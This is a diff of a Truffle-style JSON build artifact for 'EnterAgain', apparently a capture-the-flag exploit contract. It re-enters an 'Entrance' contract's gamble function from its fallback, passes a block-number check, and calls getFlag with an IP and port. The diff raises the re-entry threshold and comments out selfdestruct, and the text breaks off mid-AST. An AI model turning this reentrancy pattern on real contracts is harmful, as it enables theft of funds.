@@ -27,20 +27,20 @@
       "type": "function"
     }
   ],
-  "bytecode": "0x60806040526000805534801561001457600080fd5b506040516020806105738339810180604052810190808051906020019092919050505080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506104eb806100886000396000f300608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063e97dcb62146101d4575b34801561004d57600080fd5b506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050601e8173ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561011257600080fd5b505af1158015610126573d6000803e3d6000fd5b505050506040513d602081101561013c57600080fd5b81019080805190602001909291905050501115156101d1578073ffffffffffffffffffffffffffffffffffffffff166386da69f06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156101b857600080fd5b505af11580156101cc573d6000803e3d6000fd5b505050505b50005b3480156101e057600080fd5b506101e96101eb565b005b600080439150600061020760078461049a90919063ffffffff16565b14151561027c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f77726f6e6720626c6f636b206e756d626572000000000000000000000000000081525060200191505060405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663a59f3e0c60016040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561031157600080fd5b505af1158015610325573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff166386da69f06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561038d57600080fd5b505af11580156103a1573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff1663c19d1c256040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018080602001806020018381038352600e8152602001807f3135312e3231372e3233392e3738000000000000000000000000000000000000815250602001838103825260048152602001807f363635360000000000000000000000000000000000000000000000000000000081525060200192505050600060405180830381600087803b15801561047e57600080fd5b505af1158015610492573d6000803e3d6000fd5b505050506000ff5b60008082141515156104ab57600080fd5b81838115156104b657fe5b069050929150505600a165627a7a723058204da1a41c78eb3e0cbd73bb6e6507634e5306cf075a40a9b69de904a9a923be630029",
-  "deployedBytecode": "0x608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063e97dcb62146101d4575b34801561004d57600080fd5b506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050601e8173ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561011257600080fd5b505af1158015610126573d6000803e3d6000fd5b505050506040513d602081101561013c57600080fd5b81019080805190602001909291905050501115156101d1578073ffffffffffffffffffffffffffffffffffffffff166386da69f06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156101b857600080fd5b505af11580156101cc573d6000803e3d6000fd5b505050505b50005b3480156101e057600080fd5b506101e96101eb565b005b600080439150600061020760078461049a90919063ffffffff16565b14151561027c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f77726f6e6720626c6f636b206e756d626572000000000000000000000000000081525060200191505060405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663a59f3e0c60016040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561031157600080fd5b505af1158015610325573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff166386da69f06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561038d57600080fd5b505af11580156103a1573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff1663c19d1c256040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018080602001806020018381038352600e8152602001807f3135312e3231372e3233392e3738000000000000000000000000000000000000815250602001838103825260048152602001807f363635360000000000000000000000000000000000000000000000000000000081525060200192505050600060405180830381600087803b15801561047e57600080fd5b505af1158015610492573d6000803e3d6000fd5b505050506000ff5b60008082141515156104ab57600080fd5b81838115156104b657fe5b069050929150505600a165627a7a723058204da1a41c78eb3e0cbd73bb6e6507634e5306cf075a40a9b69de904a9a923be630029",
-  "sourceMap": "85:584:1:-;;;156:1;138:19;;179:47;8:9:-1;5:2;;;30:1;27;20:12;5:2;179:47:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;217:2;213:1;;:6;;;;;;;;;;;;;;;;;;179:47;85:584;;;;;;",
-  "deployedSourceMap": "85:584:1:-;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;85:584:1;544:17;573:1;;;;;;;;;;;544:31;;615:2;588:8;:17;;;606:4;588:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;588:23:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;588:23:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;588:23:1;;;;;;;;;;;;;;;;:29;;585:76;;;633:8;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;633:17:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;633:17:1;;;;585:76;523:144;85:584;232:285;;8:9:-1;5:2;;;30:1;27;20:12;5:2;232:285:1;;;;;;;259:6;346:17;268:12;259:21;;312:1;298:10;306:1;299;298:7;;:10;;;;:::i;:::-;:15;290:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;375:1;;;;;;;;;;;346:31;;387:8;:14;;;402:1;387:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;387:17:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;387:17:1;;;;414:8;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;414:17:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;414:17:1;;;;441:8;:16;;;:42;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;441:42:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;441:42:1;;;;506:3;493:17;3311:121:0;3369:7;3401:1;3396;:6;;3388:15;;;;;;;;3424:1;3420;:5;;;;;;;;3413:12;;3311:121;;;;:::o",
-  "source": "pragma solidity >=0.4.21 <0.6.0;\n\nimport \"./entrance.sol\";\nimport \"./SafeMath.sol\";\n\ncontract EnterAgain {\n    using SafeMath for *;\n\n    uint256 counter = 0;\n    address a;\n\n    constructor(address _a) {\n        a = _a;\n    }\n\n    function enter() {\n        uint b = block.number;\n        require((b).mod(7) == 0, \"wrong block number\");\n        Entrance entrance = Entrance(a);\n        entrance.enter(1);\n        entrance.gamble();\n        entrance.getFlag(\"151.217.239.78\", \"6656\");\n        selfdestruct(0x0);\n    }\n\n    function() {\n        Entrance entrance = Entrance(a);\n        if(entrance.balances(this) <= 30) {\n            entrance.gamble();\n        }\n    }\n}\n",
+  "bytecode": "0x60806040526000805534801561001457600080fd5b506040516020806105748339810180604052810190808051906020019092919050505080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506104ec806100886000396000f300608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063e97dcb62146101d5575b34801561004d57600080fd5b506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905061012c8173ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561011357600080fd5b505af1158015610127573d6000803e3d6000fd5b505050506040513d602081101561013d57600080fd5b81019080805190602001909291905050501115156101d2578073ffffffffffffffffffffffffffffffffffffffff166386da69f06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156101b957600080fd5b505af11580156101cd573d6000803e3d6000fd5b505050505b50005b3480156101e157600080fd5b506101ea6101ec565b005b600080439150600061020860078461049b90919063ffffffff16565b14151561027d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f77726f6e6720626c6f636b206e756d626572000000000000000000000000000081525060200191505060405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663a59f3e0c60016040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561031257600080fd5b505af1158015610326573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff166386da69f06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561038e57600080fd5b505af11580156103a2573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff1663c19d1c256040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018080602001806020018381038352600e8152602001807f3135312e3231372e3233392e3738000000000000000000000000000000000000815250602001838103825260048152602001807f363635360000000000000000000000000000000000000000000000000000000081525060200192505050600060405180830381600087803b15801561047f57600080fd5b505af1158015610493573d6000803e3d6000fd5b505050505050565b60008082141515156104ac57600080fd5b81838115156104b757fe5b069050929150505600a165627a7a7230582074fa93c6c15ec7ec87f971c0b0387f56fe7cf3b495dd81628bc558b736233e0d0029",
+  "deployedBytecode": "0x608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063e97dcb62146101d5575b34801561004d57600080fd5b506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905061012c8173ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561011357600080fd5b505af1158015610127573d6000803e3d6000fd5b505050506040513d602081101561013d57600080fd5b81019080805190602001909291905050501115156101d2578073ffffffffffffffffffffffffffffffffffffffff166386da69f06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156101b957600080fd5b505af11580156101cd573d6000803e3d6000fd5b505050505b50005b3480156101e157600080fd5b506101ea6101ec565b005b600080439150600061020860078461049b90919063ffffffff16565b14151561027d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f77726f6e6720626c6f636b206e756d626572000000000000000000000000000081525060200191505060405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663a59f3e0c60016040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561031257600080fd5b505af1158015610326573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff166386da69f06040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561038e57600080fd5b505af11580156103a2573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff1663c19d1c256040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018080602001806020018381038352600e8152602001807f3135312e3231372e3233392e3738000000000000000000000000000000000000815250602001838103825260048152602001807f363635360000000000000000000000000000000000000000000000000000000081525060200192505050600060405180830381600087803b15801561047f57600080fd5b505af1158015610493573d6000803e3d6000fd5b505050505050565b60008082141515156104ac57600080fd5b81838115156104b757fe5b069050929150505600a165627a7a7230582074fa93c6c15ec7ec87f971c0b0387f56fe7cf3b495dd81628bc558b736233e0d0029",
+  "sourceMap": "85:587:1:-;;;156:1;138:19;;179:47;8:9:-1;5:2;;;30:1;27;20:12;5:2;179:47:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;217:2;213:1;;:6;;;;;;;;;;;;;;;;;;179:47;85:587;;;;;;",
+  "deployedSourceMap": "85:587:1:-;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;85:587:1;546:17;575:1;;;;;;;;;;;546:31;;617:3;590:8;:17;;;608:4;590:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;590:23:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;590:23:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;590:23:1;;;;;;;;;;;;;;;;:30;;587:77;;;636:8;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;636:17:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;636:17:1;;;;587:77;525:145;85:587;232:287;;8:9:-1;5:2;;;30:1;27;20:12;5:2;232:287:1;;;;;;;259:6;346:17;268:12;259:21;;312:1;298:10;306:1;299;298:7;;:10;;;;:::i;:::-;:15;290:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;375:1;;;;;;;;;;;346:31;;387:8;:14;;;402:1;387:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;387:17:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;387:17:1;;;;414:8;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;414:17:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;414:17:1;;;;441:8;:16;;;:42;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;441:42:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;441:42:1;;;;232:287;;:::o;3311:121:0:-;3369:7;3401:1;3396;:6;;3388:15;;;;;;;;3424:1;3420;:5;;;;;;;;3413:12;;3311:121;;;;:::o",
+  "source": "pragma solidity >=0.4.21 <0.6.0;\n\nimport \"./entrance.sol\";\nimport \"./SafeMath.sol\";\n\ncontract EnterAgain {\n    using SafeMath for *;\n\n    uint256 counter = 0;\n    address a;\n\n    constructor(address _a) {\n        a = _a;\n    }\n\n    function enter() {\n        uint b = block.number;\n        require((b).mod(7) == 0, \"wrong block number\");\n        Entrance entrance = Entrance(a);\n        entrance.enter(1);\n        entrance.gamble();\n        entrance.getFlag(\"151.217.239.78\", \"6656\");\n        //selfdestruct(0x0);\n    }\n\n    function() {\n        Entrance entrance = Entrance(a);\n        if(entrance.balances(this) <= 300) {\n            entrance.gamble();\n        }\n    }\n}\n",
   "sourcePath": "/Users/linkeex/Projects/ccc/solidity/contracts/enteragain.sol",
   "ast": {
     "absolutePath": "/Users/linkeex/Projects/ccc/solidity/contracts/enteragain.sol",
     "exportedSymbols": {
       "EnterAgain": [
-        385
+        381
       ]
     },
-    "id": 386,
+    "id": 382,
     "nodeType": "SourceUnit",
     "nodes": [
       {
@@ -62,8 +62,8 @@
         "file": "./entrance.sol",
         "id": 295,
         "nodeType": "ImportDirective",
-        "scope": 386,
-        "sourceUnit": 580,
+        "scope": 382,
+        "sourceUnit": 576,
         "src": "34:24:1",
         "symbolAliases": [],
         "unitAlias": ""
@@ -73,7 +73,7 @@
         "file": "./SafeMath.sol",
         "id": 296,
         "nodeType": "ImportDirective",
-        "scope": 386,
+        "scope": 382,
         "sourceUnit": 293,
         "src": "59:24:1",
         "symbolAliases": [],
@@ -85,9 +85,9 @@
         "contractKind": "contract",
         "documentation": null,
         "fullyImplemented": true,
-        "id": 385,
+        "id": 381,
         "linearizedBaseContracts": [
-          385
+          381
         ],
         "name": "EnterAgain",
         "nodeType": "ContractDefinition",
@@ -115,7 +115,7 @@
             "id": 301,
             "name": "counter",
             "nodeType": "VariableDeclaration",
-            "scope": 385,
+            "scope": 381,
             "src": "138:19:1",
             "stateVariable": true,
             "storageLocation": "default",
@@ -158,7 +158,7 @@
             "id": 303,
             "name": "a",
             "nodeType": "VariableDeclaration",
-            "scope": 385,
+            "scope": 381,
             "src": "163:9:1",
             "stateVariable": true,
             "storageLocation": "default",
@@ -281,7 +281,7 @@
               "parameters": [],
               "src": "203:0:1"
             },
-            "scope": 385,
+            "scope": 381,
             "src": "179:47:1",
             "stateMutability": "nonpayable",
             "superFunction": null,
@@ -289,9 +289,9 @@
           },
           {
             "body": {
-              "id": 360,
+              "id": 356,
               "nodeType": "Block",
-              "src": "249:268:1",
+              "src": "249:270:1",
               "statements": [
                 {
                   "assignments": [
@@ -303,7 +303,7 @@
                       "id": 317,
                       "name": "b",
                       "nodeType": "VariableDeclaration",
-                      "scope": 361,
+                      "scope": 357,
                       "src": "259:6:1",
                       "stateVariable": false,
                       "storageLocation": "default",
@@ -334,7 +334,7 @@
                       "name": "block",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
-                      "referencedDeclaration": 584,
+                      "referencedDeclaration": 580,
                       "src": "268:5:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_magic_block",
@@ -520,10 +520,10 @@
                       "name": "require",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [
-                        597,
-                        598
+                        593,
+                        594
                       ],
-                      "referencedDeclaration": 598,
+                      "referencedDeclaration": 594,
                       "src": "290:7:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
@@ -558,12 +558,12 @@
                       "id": 333,
                       "name": "entrance",
                       "nodeType": "VariableDeclaration",
-                      "scope": 361,
+                      "scope": 357,
                       "src": "346:17:1",
                       "stateVariable": false,
                       "storageLocation": "default",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_Entrance_$579",
+                        "typeIdentifier": "t_contract$_Entrance_$575",
                         "typeString": "contract Entrance"
                       },
                       "typeName": {
@@ -571,10 +571,10 @@
                         "id": 332,
                         "name": "Entrance",
                         "nodeType": "UserDefinedTypeName",
-                        "referencedDeclaration": 579,
+                        "referencedDeclaration": 575,
                         "src": "346:8:1",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Entrance_$579",
+                          "typeIdentifier": "t_contract$_Entrance_$575",
                           "typeString": "contract Entrance"
                         }
                       },
@@ -611,10 +611,10 @@
                       "name": "Entrance",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
-                      "referencedDeclaration": 579,
+                      "referencedDeclaration": 575,
                       "src": "366:8:1",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_type$_t_contract$_Entrance_$579_$",
+                        "typeIdentifier": "t_type$_t_contract$_Entrance_$575_$",
                         "typeString": "type(contract Entrance)"
                       }
                     },
@@ -628,7 +628,7 @@
                     "nodeType": "FunctionCall",
                     "src": "366:11:1",
                     "typeDescriptions": {
-                      "typeIdentifier": "t_contract$_Entrance_$579",
+                      "typeIdentifier": "t_contract$_Entrance_$575",
                       "typeString": "contract Entrance"
                     }
                   },
@@ -674,7 +674,7 @@
                         "referencedDeclaration": 333,
                         "src": "387:8:1",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Entrance_$579",
+                          "typeIdentifier": "t_contract$_Entrance_$575",
                           "typeString": "contract Entrance"
                         }
                       },
@@ -685,7 +685,7 @@
                       "lValueRequested": false,
                       "memberName": "enter",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 468,
+                      "referencedDeclaration": 464,
                       "src": "387:14:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
@@ -725,7 +725,7 @@
                         "referencedDeclaration": 333,
                         "src": "414:8:1",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Entrance_$579",
+                          "typeIdentifier": "t_contract$_Entrance_$575",
                           "typeString": "contract Entrance"
                         }
                       },
@@ -736,7 +736,7 @@
                       "lValueRequested": false,
                       "memberName": "gamble",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 555,
+                      "referencedDeclaration": 551,
                       "src": "414:15:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
@@ -822,7 +822,7 @@
                         "referencedDeclaration": 333,
                         "src": "441:8:1",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Entrance_$579",
+                          "typeIdentifier": "t_contract$_Entrance_$575",
                           "typeString": "contract Entrance"
                         }
                       },
@@ -833,7 +833,7 @@
                       "lValueRequested": false,
                       "memberName": "getFlag",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 578,
+                      "referencedDeclaration": 574,
                       "src": "441:16:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$__$",
@@ -857,70 +857,11 @@
                   "id": 355,
                   "nodeType": "ExpressionStatement",
                   "src": "441:42:1"
-                },
-                {
-                  "expression": {
-                    "argumentTypes": null,
-                    "arguments": [
-                      {
-                        "argumentTypes": null,
-                        "hexValue": "307830",
-                        "id": 357,
-                        "isConstant": false,
-                        "isLValue": false,
-                        "isPure": true,
-                        "kind": "number",
-                        "lValueRequested": false,
-                        "nodeType": "Literal",
-                        "src": "506:3:1",
-                        "subdenomination": null,
-                        "typeDescriptions": {
-                          "typeIdentifier": "t_rational_0_by_1",
-                          "typeString": "int_const 0"
-                        },
-                        "value": "0x0"
-                      }
-                    ],
-                    "expression": {
-                      "argumentTypes": [
-                        {
-                          "typeIdentifier": "t_rational_0_by_1",
-                          "typeString": "int_const 0"
-                        }
-                      ],
-                      "id": 356,
-                      "name": "selfdestruct",
-                      "nodeType": "Identifier",
-                      "overloadedDeclarations": [],
-                      "referencedDeclaration": 602,
-                      "src": "493:12:1",
-                      "typeDescriptions": {
-                        "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_$returns$__$",
-                        "typeString": "function (address)"
-                      }
-                    },
-                    "id": 358,
-                    "isConstant": false,
-                    "isLValue": false,
-                    "isPure": false,
-                    "kind": "functionCall",
-                    "lValueRequested": false,
-                    "names": [],
-                    "nodeType": "FunctionCall",
-                    "src": "493:17:1",
-                    "typeDescriptions": {
-                      "typeIdentifier": "t_tuple$__$",
-                      "typeString": "tuple()"
-                    }
-                  },
-                  "id": 359,
-                  "nodeType": "ExpressionStatement",
-                  "src": "493:17:1"
                 }
               ]
             },
             "documentation": null,
-            "id": 361,
+            "id": 357,
             "implemented": true,
             "isConstructor": false,
             "isDeclaredConst": false,
@@ -940,45 +881,45 @@
               "parameters": [],
               "src": "249:0:1"
             },
-            "scope": 385,
-            "src": "232:285:1",
+            "scope": 381,
+            "src": "232:287:1",
             "stateMutability": "nonpayable",
             "superFunction": null,
             "visibility": "public"
           },
           {
             "body": {
-              "id": 383,
+              "id": 379,
               "nodeType": "Block",
-              "src": "534:133:1",
+              "src": "536:134:1",
               "statements": [
                 {
                   "assignments": [
-                    365
+                    361
                   ],
                   "declarations": [
                     {
                       "constant": false,
-                      "id": 365,
+                      "id": 361,
                       "name": "entrance",
                       "nodeType": "VariableDeclaration",
-                      "scope": 384,
-                      "src": "544:17:1",
+                      "scope": 380,
+                      "src": "546:17:1",
                       "stateVariable": false,
                       "storageLocation": "default",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_Entrance_$579",
+                        "typeIdentifier": "t_contract$_Entrance_$575",
                         "typeString": "contract Entrance"
                       },
                       "typeName": {
                         "contractScope": null,
-                        "id": 364,
+                        "id": 360,
                         "name": "Entrance",
                         "nodeType": "UserDefinedTypeName",
-                        "referencedDeclaration": 579,
-                        "src": "544:8:1",
+                        "referencedDeclaration": 575,
+                        "src": "546:8:1",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Entrance_$579",
+                          "typeIdentifier": "t_contract$_Entrance_$575",
                           "typeString": "contract Entrance"
                         }
                       },
@@ -986,18 +927,18 @@
                       "visibility": "internal"
                     }
                   ],
-                  "id": 369,
+                  "id": 365,
                   "initialValue": {
                     "argumentTypes": null,
                     "arguments": [
                       {
                         "argumentTypes": null,
-                        "id": 367,
+                        "id": 363,
                         "name": "a",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 303,
-                        "src": "573:1:1",
+                        "src": "575:1:1",
                         "typeDescriptions": {
                           "typeIdentifier": "t_address",
                           "typeString": "address"
@@ -1011,18 +952,18 @@
                           "typeString": "address"
                         }
                       ],
-                      "id": 366,
+                      "id": 362,
                       "name": "Entrance",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
-                      "referencedDeclaration": 579,
-                      "src": "564:8:1",
+                      "referencedDeclaration": 575,
+                      "src": "566:8:1",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_type$_t_contract$_Entrance_$579_$",
+                        "typeIdentifier": "t_type$_t_contract$_Entrance_$575_$",
                         "typeString": "type(contract Entrance)"
                       }
                     },
-                    "id": 368,
+                    "id": 364,
                     "isConstant": false,
                     "isLValue": false,
                     "isPure": false,
@@ -1030,14 +971,14 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "564:11:1",
+                    "src": "566:11:1",
                     "typeDescriptions": {
-                      "typeIdentifier": "t_contract$_Entrance_$579",
+                      "typeIdentifier": "t_contract$_Entrance_$575",
                       "typeString": "contract Entrance"
                     }
                   },
                   "nodeType": "VariableDeclarationStatement",
-                  "src": "544:31:1"
+                  "src": "546:31:1"
                 },
                 {
                   "condition": {
@@ -1046,7 +987,7 @@
                       "typeIdentifier": "t_uint256",
                       "typeString": "uint256"
                     },
-                    "id": 375,
+                    "id": 371,
                     "isConstant": false,
                     "isLValue": false,
                     "isPure": false,
@@ -1056,14 +997,14 @@
                       "arguments": [
                         {
                           "argumentTypes": null,
-                          "id": 372,
+                          "id": 368,
                           "name": "this",
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
-                          "referencedDeclaration": 611,
-                          "src": "606:4:1",
+                          "referencedDeclaration": 607,
+                          "src": "608:4:1",
                           "typeDescriptions": {
-                            "typeIdentifier": "t_contract$_EnterAgain_$385",
+                            "typeIdentifier": "t_contract$_EnterAgain_$381",
                             "typeString": "contract EnterAgain"
                           }
                         }
@@ -1071,38 +1012,38 @@
                       "expression": {
                         "argumentTypes": [
                           {
-                            "typeIdentifier": "t_contract$_EnterAgain_$385",
+                            "typeIdentifier": "t_contract$_EnterAgain_$381",
                             "typeString": "contract EnterAgain"
                           }
                         ],
                         "expression": {
                           "argumentTypes": null,
-                          "id": 370,
+                          "id": 366,
                           "name": "entrance",
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
-                          "referencedDeclaration": 365,
-                          "src": "588:8:1",
+                          "referencedDeclaration": 361,
+                          "src": "590:8:1",
                           "typeDescriptions": {
-                            "typeIdentifier": "t_contract$_Entrance_$579",
+                            "typeIdentifier": "t_contract$_Entrance_$575",
                             "typeString": "contract Entrance"
                           }
                         },
-                        "id": 371,
+                        "id": 367,
                         "isConstant": false,
                         "isLValue": false,
                         "isPure": false,
                         "lValueRequested": false,
                         "memberName": "balances",
                         "nodeType": "MemberAccess",
-                        "referencedDeclaration": 394,
-                        "src": "588:17:1",
+                        "referencedDeclaration": 390,
+                        "src": "590:17:1",
                         "typeDescriptions": {
                           "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                           "typeString": "function (address) view external returns (uint256)"
                         }
                       },
-                      "id": 373,
+                      "id": 369,
                       "isConstant": false,
                       "isLValue": false,
                       "isPure": false,
@@ -1110,7 +1051,7 @@
                       "lValueRequested": false,
                       "names": [],
                       "nodeType": "FunctionCall",
-                      "src": "588:23:1",
+                      "src": "590:23:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_uint256",
                         "typeString": "uint256"
@@ -1120,36 +1061,36 @@
                     "operator": "<=",
                     "rightExpression": {
                       "argumentTypes": null,
-                      "hexValue": "3330",
-                      "id": 374,
+                      "hexValue": "333030",
+                      "id": 370,
                       "isConstant": false,
                       "isLValue": false,
                       "isPure": true,
                       "kind": "number",
                       "lValueRequested": false,
                       "nodeType": "Literal",
-                      "src": "615:2:1",
+                      "src": "617:3:1",
                       "subdenomination": null,
                       "typeDescriptions": {
-                        "typeIdentifier": "t_rational_30_by_1",
-                        "typeString": "int_const 30"
+                        "typeIdentifier": "t_rational_300_by_1",
+                        "typeString": "int_const 300"
                       },
-                      "value": "30"
+                      "value": "300"
                     },
-                    "src": "588:29:1",
+                    "src": "590:30:1",
                     "typeDescriptions": {
                       "typeIdentifier": "t_bool",
                       "typeString": "bool"
                     }
                   },
                   "falseBody": null,
-                  "id": 382,
+                  "id": 378,
                   "nodeType": "IfStatement",
-                  "src": "585:76:1",
+                  "src": "587:77:1",
                   "trueBody": {
-                    "id": 381,
+                    "id": 377,
